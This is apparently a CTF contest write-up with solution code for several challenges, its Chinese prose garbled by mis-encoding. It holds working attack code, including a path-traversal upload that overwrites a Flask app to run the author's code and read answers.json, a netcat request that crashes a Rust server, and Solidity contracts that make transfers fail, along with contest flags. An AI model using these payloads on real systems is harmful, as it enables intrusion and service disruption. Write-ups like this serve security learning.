    for (int i = 127; i >= 0; i--)
    {
        buffer[i] = malloc(BLOCK_SIZE);
        if (buffer[i] == NULL)
        {
            perror("failed to allocate buffer");
            close(file);
            exit(EXIT_FAILURE);
        }
        lseek(file, i * BLOCK_SIZE, SEEK_SET);
        if (readn(file, buffer[i], BLOCK_SIZE) <= 0)
        {
            perror("failed to read from file");
            close(file);
            exit(EXIT_FAILURE);
        }
        if (ftruncate(file, i * BLOCK_SIZE) < 0)
        {
            perror("failed to truncate file");
            close(file);
            exit(EXIT_FAILURE);
        }
    }
    close(file);

    int file1 = open("/space/file1", O_WRONLY | O_CREAT);
    if (file1 < 0)
    {
        perror("failed to open file1");
        exit(EXIT_FAILURE);
    }

    int file2 = open("/space/file2", O_WRONLY | O_CREAT);
    if (file2 < 0)
    {
        perror("failed to open file2");
        exit(EXIT_FAILURE);
    }

    // Create socket file descriptor (IPv4, TCP)
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Attach socket to the port (optional, but useful to reuse the port)
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
    {
        perror("setsockopt");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // set address and port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("failed to bind");
        close(server_fd);
        close(file1);
        close(file2);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) < 0)
    {
        perror("failed to listen");
        close(server_fd);
        close(file1);
        close(file2);
        exit(EXIT_FAILURE);
    }

    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0)
    {
        perror("failed to accept connection");
        close(server_fd);
        close(file1);
        close(file2);
        exit(EXIT_FAILURE);
    }

    for (int block = 0; block < 128; ++block)
    {
        if (writen(new_socket, buffer[block], BLOCK_SIZE) < 0)
        {
            perror("failed to write to socket");
            close(new_socket);
            close(server_fd);
            close(file1);
            close(file2);
            exit(EXIT_FAILURE);
        }

        if (block < 64)
        {
            lseek(file1, block * BLOCK_SIZE, SEEK_SET);
            if (readn(new_socket, buffer[block], BLOCK_SIZE) <= 0)
            {
                perror("failed to read from socket");
                close(new_socket);
                close(server_fd);
                close(file1);
                close(file2);
                exit(EXIT_FAILURE);
            }

            if (writen(file1, buffer[block], BLOCK_SIZE) < 0)
            {
                perror("failed to write to file");
                close(new_socket);
                close(server_fd);
                close(file1);
                close(file2);
                exit(EXIT_FAILURE);
            }

            free(buffer[block]);
        }
        else
        {
            lseek(file2, (block - 64) * BLOCK_SIZE, SEEK_SET);
            if (readn(new_socket, buffer[block], BLOCK_SIZE) <= 0)
            {
                perror("failed to read from socket");
                close(new_socket);
                close(server_fd);
                close(file1);
                close(file2);
                exit(EXIT_FAILURE);
            }

            if (writen(file2, buffer[block], BLOCK_SIZE) < 0)
            {
                perror("failed to write to file");
                close(new_socket);
                close(server_fd);
                close(file1);
                close(file2);
                exit(EXIT_FAILURE);
            }

            free(buffer[block]);
        }
    }

    close(new_socket);
    close(server_fd);
    close(file1);
    close(file2);
    return 0;
}
```

**Bob (client)**

```c
int main()
{
    int sock = 0;
    struct sockaddr_in serv_addr;
    char *buffer[128];

    int file1 = open("/space/file1", O_RDWR);
    if (file1 < 0)
    {
        perror("failed to open file1");
        exit(EXIT_FAILURE);
    }

    int file2 = open("/space/file2", O_RDWR);
    if (file2 < 0)
    {
        perror("failed to open file2");
        exit(EXIT_FAILURE);
    }

    for (int i = 63; i >= 0; --i)
    {
        buffer[i] = malloc(BLOCK_SIZE);
        if (buffer[i] == NULL)
        {
            perror("failed to allocate buffer");
            close(file1);
            close(file2);
            exit(EXIT_FAILURE);
        }
        lseek(file1, i * BLOCK_SIZE, SEEK_SET);
        if (readn(file1, buffer[i], BLOCK_SIZE) <= 0)
        {
            perror("failed to read from file1");
            close(file1);
            close(file2);
            exit(EXIT_FAILURE);
        }
        if (ftruncate(file1, i * BLOCK_SIZE) < 0)
        {
            perror("failed to truncate file1");
            close(file1);
            close(file2);
            exit(EXIT_FAILURE);
        }
    }
    close(file1);

    for (int i = 63; i >= 0; --i)
    {
        buffer[i + 64] = malloc(BLOCK_SIZE);
        if (buffer[i + 64] == NULL)
        {
            perror("failed to allocate buffer");
            close(file2);
            exit(EXIT_FAILURE);
        }
        lseek(file2, i * BLOCK_SIZE, SEEK_SET);
        if (readn(file2, buffer[i + 64], BLOCK_SIZE) <= 0)
        {
            perror("failed to read from file2");
            close(file2);
            exit(EXIT_FAILURE);
        }
        if (ftruncate(file2, i * BLOCK_SIZE) < 0)
        {
            perror("failed to truncate file2");
            close(file2);
            exit(EXIT_FAILURE);
        }
    }
    close(file2);

    // Create socket file descriptor (IPv4, TCP)
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Socket creation error");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 address from text to binary form
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
    {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    int n = 0;
    while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        if (n++ > 10)
        {
            perror("failed to connect");
            exit(EXIT_FAILURE);
        }
        sleep(1);
    }

    int file = open("/space/file", O_WRONLY | O_CREAT);
    if (file < 0)
    {
        perror("failed to open file");
        close(sock);
        exit(EXIT_FAILURE);
    }

    for (int block = 0; block < 128; ++block)
    {
        if (writen(sock, buffer[block], BLOCK_SIZE) <= 0)
        {
            perror("failed to write to socket");
            close(sock);
            close(file);
            exit(EXIT_FAILURE);
        }

        lseek(file, block * BLOCK_SIZE, SEEK_SET);
        if (readn(sock, buffer[block], BLOCK_SIZE) <= 0)
        {
            perror("failed to read from socket");
            close(sock);
            close(file);
            exit(EXIT_FAILURE);
        }

        if (writen(file, buffer[block], BLOCK_SIZE) <= 0)
        {
            perror("failed to write to file");
            close(sock);
            close(file);
            exit(EXIT_FAILURE);
        }

        free(buffer[block]);
    }

    close(sock);
    close(file);
    return 0;
}
```

**`flag{fa1I0catiIling_1NChains_15fun_3e0b510659}`**

## é“¾ä¸Šè½¬è´¦åŠ©æ‰‹

> å…³äºæˆ‘å¯¹åŒºå—é“¾ä¸€çªä¸é€šä½†æ˜¯ç”¨ o1-preview å½“å¤–æŒ‚éª—äº† 250 åˆ†è¿™ä»¶äº‹

è¿™é¢˜[å…¨æ‹¿ ChatGPT å†™çš„](https://chatgpt.com/share/672ff67c-b524-800d-b033-4d09c91a93d5)ã€‚æˆ‘çœŸçš„ä¸€ç‚¹æ²¡çœ‹æ‡‚ï¼Œæ„Ÿè§‰åŒºå—é“¾è¿™å—è¿˜æ˜¯å¾—è¡¥è¡¥è¯¾...

### è½¬è´¦å¤±è´¥

~~æˆ‘ç°åœ¨æ‰æ„è¯†åˆ°å½“æ—¶å°±æ˜¯ç…§æŠ„äº† `challenge1.sol` å°±è¿‡äº†ï¼Ÿï¼Ÿï¼Ÿ~~

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

        uint256 totalAmount = 0;
        uint256 i;

        for (i = 0; i < amounts.length; i++) {
            totalAmount += amounts[i];
        }

        require(totalAmount == msg.value, "Incorrect total amount");

        for (i = 0; i < recipients.length; i++) {
            recipients[i].transfer(amounts[i]);
        }
    }
}
```

**`flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt_33c5d8b096}`**

### è½¬è´¦åˆå¤±è´¥

~~å¯¹ï¼Œå¯¹å—ï¼Ÿå“¦å¯¹çš„å¯¹çš„ï¼Œå“¦ä¸å¯¹ä¸å¯¹~~

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract GasGuzzler {
    fallback() external payable {
        // Consume gas in a loop
        for (uint256 i = 0; i < 1000000; i++) {
            // Do some computation to consume gas
            uint256 x = i * i;
        }
    }
}
```

**`flag{Ple4se_L1m1t_y0uR_GAS_HaHa_5963670813}`**


## ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿

> ä¸€ä¸ªæ–‡ä»¶ï¼Œè®© VSCode æŠ¥äº† 800 ä¸ªé”™

è¿™é¢˜åŸºæœ¬ä¸Šï¼ˆåˆæ˜¯ï¼‰[å…¨æ‹¿ ChatGPT å†™çš„](https://chatgpt.com/share/672ff232-7a80-800d-ac93-36de8b7abe5c)ï¼Œæˆ‘å°±é…äº†ç‚¹ç¯å¢ƒæ”¹äº†ç‚¹è¯­æ³•é”™è¯¯ã€‚

### What DBus Gonna Do?

GPT å‘Šè¯‰æˆ‘è¯´å†™ä¸€ä¸ª shell script é‡Œé¢ç”¨ `gdbus call` å°±å¥½äº†ã€‚

```sh
#!/bin/bash
gdbus call --system \
    --dest "cn.edu.ustc.lug.hack.FlagService" \
    --object-path "/cn/edu/ustc/lug/hack/FlagService" \
    --method "cn.edu.ustc.lug.hack.FlagService.GetFlag1" \
    "Please give me flag1"
```

**`flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_7ba2433f99}`**

### If I Could Be A File Descriptor

GPT å‘Šè¯‰æˆ‘è¯´å†™ä¸€ä¸ª C ä»£ç é‡Œé¢å…ˆ `pipe()` ä¸€ä¸ª `fd` å‡ºæ¥å†ç”¨ `g_dbus_connection_call_with_unix_fd_list_sync()` å°±è¡Œäº†ï¼Œä½†æ˜¯ä»–å‚æ•°åˆ—è¡¨æ²¡ç»™å¯¹ï¼  
æˆ‘è¿™é‡Œç”¨ WSL ç¼–è¯‘çš„æ—¶å€™è€æ˜¯æŠ¥æ‰¾ä¸åˆ° `g_unix_fd_list_new_from_array` çš„é”™è¯¯ï¼Œç´¢æ€§ç›´æ¥å†™ä¸ªç©ºå£°æ˜ç®—äº†ã€‚ï¼ˆå°±æ˜¯å› ä¸ºè¿™ä¸ª VS Code Intellisense ç»™æˆ‘æŠ¥äº†ä¸€ä¸‡ä¸ªé”™ï¼‰

```c
#include <gio/gio.h>
#include <glib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define SERVICE_NAME "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define INTERFACE_NAME "cn.edu.ustc.lug.hack.FlagService"
#define METHOD_NAME "GetFlag2"

GUnixFDList *
g_unix_fd_list_new_from_array(
    const gint *fds,
    gint n_fds);

int main(int argc, char *argv[])
{
    GError *error = NULL;
    GDBusConnection *connection;
    GMainLoop *loop;
    gint pipe_fds[2];
    gchar *flag2 = NULL;

    // Connect to the system bus
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (connection == NULL)
    {
        g_printerr("Failed to connect to system bus: %s\n", error->message);
        g_error_free(error);
        return 1;
    }

    // Create a pipe
    if (pipe(pipe_fds) == -1)
    {
        perror("pipe");
        return 1;
    }

    // Write the required message to the write end of the pipe
    const char *message = "Please give me flag2\n";
    ssize_t written = write(pipe_fds[1], message, strlen(message));
    if (written != (ssize_t)strlen(message))
    {
        perror("write");
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return 1;
    }

    // Close the write end after writing
    close(pipe_fds[1]);

    // Prepare the GUnixFDList with the read end of the pipe
    GUnixFDList *fd_list = g_unix_fd_list_new_from_array(pipe_fds, 1);
    gint fd_index = 0;

    // Prepare the parameters: a tuple containing the file descriptor index
    GVariant *parameters = g_variant_new("(h)", fd_index);

    // Make the synchronous D-Bus call with the FD list
    GUnixFDList *out_fd_list;
    GVariant *result = g_dbus_connection_call_with_unix_fd_list_sync(
        connection,
        SERVICE_NAME,           // bus name
        OBJECT_PATH,            // object path
        INTERFACE_NAME,         // interface name
        METHOD_NAME,            // method name
        parameters,             // parameters
        G_VARIANT_TYPE("(s)"),  // expected reply type
        G_DBUS_CALL_FLAGS_NONE, // no flags
        -1,                     // default timeout
        fd_list,                // FD list
        &out_fd_list,           // GPT ç”Ÿæˆçš„æ—¶å€™æ²¡æœ‰ç»™å‡ºå‚ï¼å®³å¾—æˆ‘å¤šè°ƒäº†5åˆ†é’Ÿ(x)
        NULL,                   // cancellable
        &error);

    if (result == NULL)
    {
        g_printerr("D-Bus call failed: %s\n", error->message);
        g_error_free(error);
        g_object_unref(connection);
        close(pipe_fds[0]);
        return 1;
    }

    // Extract the flag2 from the result
    g_variant_get(result, "(&s)", &flag2);
    g_print("Flag2: %s\n", flag2);

    // Clean up
    g_variant_unref(result);
    g_object_unref(connection);
    close(pipe_fds[0]);

    return 0;
}
```

**`flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_db2e70a572}`**

### Comm Say Maybe

GPT å‘Šè¯‰æˆ‘è¯´...å…¶å®æˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ä»–è¯´äº†å•¥ï¼Œä½†æ˜¯æŠŠä»£ç è´´ä¸Šå»ç¼–è¯‘å®Œå°±è¿‡äº†ï¼‰

```c
#define _GNU_SOURCE
#include <gio/gio.h>
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>

// Define D-Bus parameters
#define SERVICE_NAME "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define INTERFACE_NAME "cn.edu.ustc.lug.hack.FlagService"
#define METHOD_NAME "GetFlag3"

int main(int argc, char *argv[]) {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;
    gchar *flag3 = NULL;

    // Optional: Explicitly set the process name to "getflag3"
    // This step ensures that /proc/<pid>/comm contains "getflag3\n"
    if (prctl(PR_SET_NAME, "getflag3", 0, 0, 0) != 0) {
        perror("prctl");
        // Continue even if setting the name fails
    }

    // Connect to the system bus synchronously
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    // Call the D-Bus method "GetFlag3"
    result = g_dbus_connection_call_sync(
        connection,
        SERVICE_NAME,           // Destination
        OBJECT_PATH,            // Object path
        INTERFACE_NAME,         // Interface name
        METHOD_NAME,            // Method name
        NULL,                   // Parameters
        G_VARIANT_TYPE("(s)"),  // Expected reply type
        G_DBUS_CALL_FLAGS_NONE, // no flags
        -1,                     // Timeout (default)
        NULL,                   // Cancellable
        &error
    );

    if (result) {
        // Extract the string from the tuple
        g_variant_get(result, "(&s)", &flag3);
        g_print("Flag3: %s\n", flag3);
        g_variant_unref(result);
    } else {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD_NAME, error->message);
        g_error_free(error);
    }

    // Clean up
    g_object_unref(connection);

    return EXIT_SUCCESS;
}
```

**`flag{prprprprprCTL_15your_FRiEND_750584ce15}`**


## RISC-Vï¼šè™èƒ†é¾™å¨

> HG ä½ ç»™æˆ‘å¸¦å“ªæ¥äº†ï¼Ÿè¿™è¿˜æ˜¯ IA-32 å—ï¼Ÿ

ä¸ºä»€ä¹ˆ ICS å’Œ OS éƒ½è¦æ•™ IA-32 å•Š...ä¸èƒ½ä¸æ—¶ä¿±è¿›ä¸€ç‚¹å—(?)

### è­¦å‘Šï¼šæ˜“ç¢ / Fragility

æŒ‰ç…§é¢˜ç›®è¦æ±‚æ¯ä¸ªåœ°å€åªèƒ½è¯»ä¸€æ¬¡ï¼Œé—® ChatGPT å‘ç° RISC-V æœ‰ 32 ä¸ªå¯„å­˜å™¨ï¼Œé‚£ç›´æ¥å…¨è¯»è¿›æ¥å†åœ¨å¯„å­˜å™¨é‡Œå±•å¼€ä¸€ä¸ª bubble sort å°±è¡Œäº†ã€‚

è¿™é¢˜[é…ç¯å¢ƒ](https://github.com/riscv-collab/riscv-gnu-toolchain/tree/master)èŠ±äº†æˆ‘ä¸€æ•´å¤©(?) å¼€äº†ä¸ª AWS EC2 ä»ç¡è§‰å¼€å§‹ `make`ï¼Œé†’æ¥å‘ç°è¿˜åœ¨è·‘...

**å±•å¼€å¾ªç¯çš„ python**

```python
def block(p, i):
    label = f"L{p+1}_{i+1}"
    first = 10 + i
    second = 11 + i
    template = f"""    blt x{first}, x{second}, {label}
    addi x5, x{first}, 0
    addi x{first}, x{second}, 0
    addi x{second}, x5, 0
{label}:"""
    return template


for p in range(15):
    for i in range(15):
        print(block(p, i))
```

```assembly
.section .text
_start:
    li x5, 0xf80

    lw x10, 0(x5)          # x10 = MEM[x5 + 0]
    lw x11, 4(x5)          # x11 = MEM[x5 + 4]
    lw x12, 8(x5)          # x12 = MEM[x5 + 8]
    lw x13, 12(x5)         # x13 = MEM[x5 + 12]
    lw x14, 16(x5)         # x14 = MEM[x5 + 16]
    lw x15, 20(x5)         # x15 = MEM[x5 + 20]
    lw x16, 24(x5)         # x16 = MEM[x5 + 24]
    lw x17, 28(x5)         # x17 = MEM[x5 + 28]
    lw x18, 32(x5)         # x18 = MEM[x5 + 32]
    lw x19, 36(x5)         # x19 = MEM[x5 + 36]
    lw x20, 40(x5)         # x20 = MEM[x5 + 40]
    lw x21, 44(x5)         # x21 = MEM[x5 + 44]
    lw x22, 48(x5)         # x22 = MEM[x5 + 48]
    lw x23, 52(x5)         # x23 = MEM[x5 + 52]
    lw x24, 56(x5)         # x24 = MEM[x5 + 56]
    lw x25, 60(x5)         # x25 = MEM[x5 + 60]

# å¾ªç¯æ’å…¥åœ¨è¿™é‡Œ

    li x5, 0xfc0

    sw x10, 0(x5)         # MEM[x5 + 0] = x10
    sw x11, 4(x5)         # MEM[x5 + 4] = x11
    sw x12, 8(x5)         # MEM[x5 + 8] = x12
    sw x13, 12(x5)        # MEM[x5 + 12] = x13
    sw x14, 16(x5)        # MEM[x5 + 16] = x14
    sw x15, 20(x5)        # MEM[x5 + 20] = x15
    sw x16, 24(x5)        # MEM[x5 + 24] = x16
    sw x17, 28(x5)        # MEM[x5 + 28] = x17
    sw x18, 32(x5)        # MEM[x5 + 32] = x18
    sw x19, 36(x5)        # MEM[x5 + 36] = x19
    sw x20, 40(x5)        # MEM[x5 + 40] = x20
    sw x21, 44(x5)        # MEM[x5 + 44] = x21
    sw x22, 48(x5)        # MEM[x5 + 48] = x22
    sw x23, 52(x5)        # MEM[x5 + 52] = x23
    sw x24, 56(x5)        # MEM[x5 + 56] = x24
    sw x25, 60(x5)        # MEM[x5 + 60] = x25

_end:
	j _end
```

## åŠ¨ç”»åˆ†äº«

> æ¯”èµ›ç»“æŸåæ‹¿ç€è¿™æ®µä»£ç å»é—®äº†ä¸€ä¸ªåœ¨ç”Ÿäº§ç¯å¢ƒå†™äº†ä¸¤å¹´ Rust çš„æœ‹å‹ï¼Œç»“æœä»–ä¸€ç‚¹é—®é¢˜éƒ½æ²¡çœ‹å‡ºæ¥

### åªè¦ä¸åœä¸‹ HTTP æœåŠ¡ï¼Œå“åº”å°±ä¼šä¸æ–­å»¶ä¼¸

[æ‹·æ‰“äº†ä¸€ä¼š ChatGPT](https://chatgpt.com/share/67303b8d-71a4-800d-89c4-30b8f0891dc1)ï¼Œä»–å‘Šè¯‰æˆ‘å¦‚æœç”¨ multibyte character å½“ä½œæ–‡ä»¶åçš„è¯ `let file_path = &path[1..];` ä¼š panicã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„å»ºè¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼š

```sh
#!/bin/bash
echo -e "GET Î© HTTP/1.1\r\n\r\n" | nc localhost 8000
```

**`flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_5311135c89}`**


## å…³ç¯

> `MemoryError: Unable to allocate 9.95 TiB for an array with shape (3307949, 3307949) and data type bool`  
> ~~ä¸»å”±å¤ªæ‹¼å‘½äº†ï¼~~

### Easy & Medium & Hard

æœç´¢äº†ä¸€ä¸‹ "Lights Out"ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡ç”¨ SageMath å†™çš„[æ•™ç¨‹](https://www.sfu.ca/~jtmulhol/math302/puzzles-lo.html)ã€‚  
åŸç†æ˜¯æ¯ä¸ªè¾“å…¥ä½ç½®å¯¹äºè¾“å‡ºä½ç½®çš„å½±å“æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥è¾“å‡ºæ˜¯è¾“å…¥åœ¨ GF(2) ä¸Šé¢çš„çº¿æ€§ç»„åˆã€‚  
é‚£ä¹ˆåªè¦æˆ‘ä»¬æ„å»ºè¿™ä¸ªçº¿æ€§å…³ç³»å¯¹åº”çš„ $\mathbb{R}^{n^3 \times n^3}$ çŸ©é˜µï¼Œå¯¹å®ƒâ€œæ±‚é€†â€å³å¯å¾—åˆ°ä»è¾“å‡ºåˆ°è¾“å…¥çš„åå‘æ˜ å°„ã€‚ï¼ˆå®é™…ä¸Šåœ¨ $n \geq 5$ çš„æ—¶å€™è¿™ä¸ªçŸ©é˜µå°±ä¸æ˜¯æ»¡ç§©çš„äº†ï¼Œä½†å› ä¸ºæˆ‘ä»¬æ ¹æ®ç”Ÿæˆçš„è¿‡ç¨‹çŸ¥é“è‚¯å®šæœ‰è§£ï¼Œæ‰€ä»¥ç›´æ¥è°ƒç”¨ `solve_right()` å³å¯ï¼‰  
æœ¬æ¥æ‡’å¾—é…ä¸€ä¸ªæ–°çš„ SageMath ç¯å¢ƒï¼Œæƒ³è‡ªå·±æ‰‹æ“ä¸€ä¸ªé«˜æ–¯æ¶ˆå…ƒï¼Œç»“æœå†™çš„ä»£ç åˆ°å¤„æ¼é£ã€‚æ­£å¥½ä¸ºäº†æ•´ RISC-V å·²ç»å¼€äº†ä¸€ä¸ª EC2 äº†ï¼Œå°±å¹²è„†æŒªåˆ°é‚£ä¸Šé¢å»ç”¨ SageMath äº†ã€‚

```python
from sage.all import *
from pwn import *
import os

def lights_out(n):
    A = matrix(GF(2), n * n * n, n * n * n)
    for i in range(n):
        for j in range(n):
            for k in range(n):
                m = n * n * i + j * n + k * 1
                A[(m, m)] = 1
                if i > 0:
                    A[(m, m - n * n)] = 1
                if i < n - 1:
                    A[(m, m + n * n)] = 1
                if j > 0:
                    A[(m, m - n)] = 1
                if j < n - 1:
                    A[(m, m + n)] = 1
                if k > 0:
                    A[(m, m - 1)] = 1
                if k < n - 1:
                    A[(m, m + 1)] = 1
    return A

q = 3
if q == 1:
    l = 3
elif q == 2:
    l = 5
elif q == 3:
    l = 11
A = lights_out(l)

r = remote("202.38.93.141", 10098)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())

r.recvuntil(b"(1~4): ")
r.sendline(str(q).encode())
s = r.recvline().decode().strip()
b = vector(GF(2), list(map(int, s)))

x = A.solve_right(b)
res = "".join(str(i) for i in x)
r.recvuntil(b": ")
r.sendline(res.encode())
r.interactive()
```

1. **`flag{bru7e_f0rce_1s_a1l_y0u_n3ed_e487e39c43}`**
2. **`flag{prun1ng_1s_u5eful_f493badcaf}`**
3. **`flag{lin3ar_alg3bra_1s_p0werful_d599861895}`**

(ä»¥åŠ Copilot è‡ªåŠ¨è¡¥å…¨çš„ä¸¤ä¸ª fake flag)

4. flag{g4uss_j0rdan_3liminat10n_1s_c00l_8d5f2d3b7e}
5. flag{g4lo1s_f13lds_4re_4w3s0me_7f4d6b4b0a}


## ç¦æ­¢å†…å·

æœ€å¼€å§‹æƒ³æŒ‰ç…§ä»£ç é€»è¾‘ï¼Œæšä¸¾æ¯ä¸€ä½çœ‹æ–¹å·®çš„æ”¹å˜å€¼åæ¨å‡ºåŸæœ¬çš„å€¼ã€‚å°è¯•åå‘ç°å› ä¸ºè´Ÿåˆ†æ•°ä¼šè¢«è½¬æ¢æˆ 0ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è¿˜åŸå‡ºæ¯ä¸€ä½ã€‚

å†è¯»ä¸€éæºç å‘ç°äº†ä¸€ä¸ªå¾ˆç»å…¸çš„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼š
```python
file = request.files['file']
filename = file.filename
filepath = os.path.join(UPLOAD_DIR, filename)
file.save(filepath)
```
åªè¦æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åé‡Œä½¿ç”¨ `../` å°±å¯ä»¥æŠŠæ–‡ä»¶ä¿å­˜åˆ°ä»»æ„ç›®å½•ä¸‹ã€‚  
è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå› ä¸ºå¯åŠ¨æœåŠ¡å™¨çš„æ—¶å€™å¼€äº† ``--reload`ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ ä¸€ä¸ªæ–°çš„ä»£ç æ–‡ä»¶ä¸Šå»è®©æœåŠ¡å™¨è‡ªåŠ¨åŠ è½½ã€‚è€Œå…¶ä¸­çš„ä»£ç åªè¦æŠŠ `answer.json` çš„å†…å®¹è¿”å›ç»™æˆ‘ä»¬å°±å¥½äº†ã€‚

```python
import requests

addr = ""
file = """
from flask import Flask

app = Flask(__name__)


@app.route("/")
def index():
    with open("answers.json") as f:
        return f.read()
"""

requests.post(f"{addr}/submit",files={"file": ("../web/app.py", file)},)
response = requests.get(addr)
print("".join(chr(x + 65) for x in response.json()))
```

**`flag{uno!!!!_esrever_now_U_run_MY_c0de60c0c47c42}`**


## å“ˆå¸Œä¸‰ç¢°æ’

> è¿™æ˜¯ binary å—ï¼Ÿ

### ä¸‰ç¢°æ’ä¹‹ä¸€

ä¸¢è¿› ida ä¹‹åå‘ç°æŠŠæ¯ä¸ªè¾“å…¥è¿›è¡Œ `hex_to_int` ä¹‹åè°ƒåº“ç®—äº†ä¸€ä¸ªæ‘˜è¦ã€‚æŒ‚ `gdb` è¿è¡Œäº†ä¸€ä¸‹å‘ç°ç®—çš„ SHA256ã€‚éšä¾¿ä¸¢ä¸€ä¸ªè¾“å…¥è¿›å»å‘ç°åªå¤åˆ¶æ¯”è¾ƒäº†ä¸‰ä¸ª SHA256 çš„æœ€å 8 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éšæœºç¢°æ’ä¸€ä¸‹ SHA256 çš„åç¼€æäº¤å³å¯ã€‚

```python
from pwn import *
import hashlib
import random
from collections import defaultdict

d = defaultdict(list)
l = []
while True:
    x = random.getrandbits(64)
    hash = hashlib.sha256(x.to_bytes(8)).hexdigest()[-8:]
    d[hash].append(x)
    if len(d[hash]) > 2:
        l = d[hash]
        break

r = remote("202.38.93.141", 10096)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())

r.recvuntil(b": ")
r.sendline(b"1")
for x in l:
    r.recvuntil(b":")
    r.sendline(hex(x)[2:].encode())
r.interactive()
```

**`flag{341642dbbbdb68f956937b3f32087b}`**


## é›¶çŸ¥è¯†æ•°ç‹¬

> ç›´åˆ°åšå®Œéƒ½æ²¡ææ˜ç™½è¿™é¢˜çš„ ZK éƒ¨åˆ†æ˜¯æ€ä¹ˆå·¥ä½œçš„

### æ•°ç‹¬é«˜æ‰‹

æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªåœ¨çº¿çš„[æ•°ç‹¬è§£é¢˜ç½‘ç«™](https://www.sudoku-solutions.com/)ï¼ŒæŠŠé¢˜ç›®è¾“è¿›å»ç­”æ¡ˆæ•°å‡ºæ¥å°±èƒ½æ‹¿åˆ° flag äº†ã€‚

**`flag{SUD0KU_M45T3R_You_Have_Shown_Y0ur_Know1edge_ac5207a9}`**

### ZK é«˜æ‰‹

é˜…è¯»äº†ä¸€é `snarkjs` å’Œ circom çš„æ–‡æ¡£ï¼Œå‘ç°æäº¤ä¸€ä¸ªè¯æ˜éœ€è¦è¿è¡Œè¿™æ ·ä¸€ä¸ªå‘½ä»¤
```sh
snarkjs groth16 fullprove input.json sudoku.wasm sudoku.zkey proof.json public.json
```
å…¶ä¸­ `input.json` åº”è¯¥åŒ…æ‹¬ `sudoku.circom` ä¸­ `Main()` å‡½æ•°çš„æ‰€æœ‰è¾“å…¥ï¼Œåœ¨æœ¬é¢˜å°±æ˜¯ `unsolved_grid` å’Œ `solved_grid`ã€‚  
äºæ˜¯æˆ‘ä»¬å†æ¬¡åˆ©ç”¨è§£é¢˜ç½‘ç«™æŠŠæœ€å¼€å§‹çš„é¢˜ç›®å’Œå¡«å®Œçš„æ•°ç‹¬ç¼–æˆä¸€ä¸ª `{"unsolved_grid": [[...]], "solved_grid": [[...]]}` çš„ json æ–‡ä»¶ï¼Œç”¨ä»¥ä¸Šçš„å‘½ä»¤ç”Ÿæˆ `proof.json` æäº¤å³å¯ã€‚

**`flag{you_are_a_5udoku_expert_and_pr0ved_your_kn0wledge_4de53b0b86}`**

### æ— è§£ä¹‹è°œ

å¼€å¹•é›·å‡»ï¼Œè¿™ä¸ªæ•°ç‹¬æ€ä¹ˆçœ‹éƒ½æ²¡æœ‰è§£çš„å§kora

[è®© ChatGPT ä¸æ–­é˜…è¯» circom æºç ](https://chatgpt.com/share/67305017-a890-800d-9140-a43e75703fc3)ï¼Œä»–æ•é”çš„å‘ç°äº† `Main()` ä¸­æ£€æŸ¥æ•°å­—å¤§äº 0 çš„éƒ¨åˆ†æ²¡æœ‰ "enforce constraint"
```js
gt_zero_signals[i][j] <-- (solved_grid[i][j] > 0);
```

